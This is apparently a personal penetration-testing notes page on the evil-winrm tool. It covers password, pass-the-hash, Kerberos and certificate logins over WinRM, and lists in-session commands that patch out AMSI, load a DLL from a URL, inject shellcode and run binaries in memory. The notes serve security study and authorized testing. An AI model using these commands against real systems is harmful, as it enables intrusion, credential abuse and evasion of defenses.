#tools #active-directory

The go-to shell for Windows Remote Management (WinRM, port **5985** / **5986** for SSL). The payoff tool of an AD chain: with a credential *or* an NT hash for an account in **Remote Management Users** (or a local admin), it gives an interactive PowerShell session plus built-in upload/download and in-memory loaders.

## Connect — the ways in
```bash
evil-winrm -i <ip> -u <user> -p '<password>'          # password
evil-winrm -i <ip> -u Administrator -H <NT_hash>      # pass-the-hash (no cracking)
evil-winrm -i <ip> -u <user> -r <domain>              # Kerberos ticket (needs KRB5CCNAME)
evil-winrm -i <ip> -u <user> -p <pass> -S             # SSL/TLS on 5986
evil-winrm -i <ip> -c cert.pem -k key.pem -S          # certificate auth
```
Pass-the-Hash is the normal finish after [[Impacket]] `secretsdump` — the NT hash *is* the credential.

## Flag reference
| Flag | Does |
| --- | --- |
| `-i <ip>` | Target host |
| `-u <user>` / `-p <pass>` | Credentials |
| `-H <hash>` | NT hash for pass-the-hash (mutually exclusive with `-p`) |
| `-r <realm>` | Kerberos auth, realm = domain |
| `-S` | Enable SSL (port 5986) |
| `-P <port>` | Custom port |
| `-s <scripts dir>` | Local folder of **.ps1** to expose via `menu` (e.g. PowerView) |
| `-e <exes dir>` | Local folder of **.exe** for `Invoke-Binary` |
| `-c <cert>` / `-k <key>` | Public key / cert auth |
| `-l` | Log the session to a file |
| `-N` | No colors |

## Preflight if it hangs
A silent hang (no banner, no error) usually means WinRM isn't reachable, not a bad command:
```bash
nmap -p 5985 <ip>     # want 5985/tcp open (or 5986 for SSL)
crackmapexec winrm <ip> -u <user> -p <pass>   # confirms the account can WinRM in
```
CME printing `(Pwn3d!)` means that account will get a shell here.

## Not every account can WinRM
Only **Remote Management Users** or admins get a session. Low-priv accounts (typical `svc-admin`, `backup`) often **time out** even with correct creds — expected. Don't fight it: log in as **Administrator** and read everything from one session (admin reads every user's desktop):
```powershell
type C:\Users\<user>\Desktop\*.txt
dir  C:\Users\<user>\Desktop\      # if the filename is unknown
```

## In-session built-ins
```
menu                         # list loaded modules + evil-winrm commands
upload <local> <remote>      # push a file
download <remote> <local>    # pull a file
services                     # list services
Invoke-Binary /path/x.exe    # run a .exe in memory (from -e dir), no disk write
Bypass-4MSI                  # patch AMSI in the session before loading tooling
Dll-Loader -http <url>       # reflectively load a DLL
Donut-Loader -process_id <pid> -donutfile <f>   # inject shellcode
```
Load PowerView/PrivEsc scripts by starting with `-s <dir>` and calling them from `menu`.

## Alternatives for a shell
- `psexec.py` / `wmiexec.py` ([[Impacket]]) — when WinRM is closed but SMB/RPC is open; psexec gives **SYSTEM**.
- `crackmapexec winrm/smb ... -x '<cmd>'` — fire a single command without a full shell.
- RDP (`xfreerdp /u:.. /pth:<hash> /v:<ip>`) when 3389 is open and you want a GUI.

Final step of [[Active Directory Exploitation]].
